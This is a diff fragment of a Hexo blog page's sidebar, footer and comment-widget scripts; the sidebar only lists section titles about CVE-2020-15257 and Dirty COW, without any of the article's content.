class="nav-link" href="#CVE-2020-15257"><span class="nav-number">1.2.6.</span> <span class="nav-text">CVE-2020-15257</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%8F%E7%89%9B%E4%B8%8EVDSO"><span class="nav-number">1.2.7.</span> <span class="nav-text">脏牛与VDSO</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.3.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
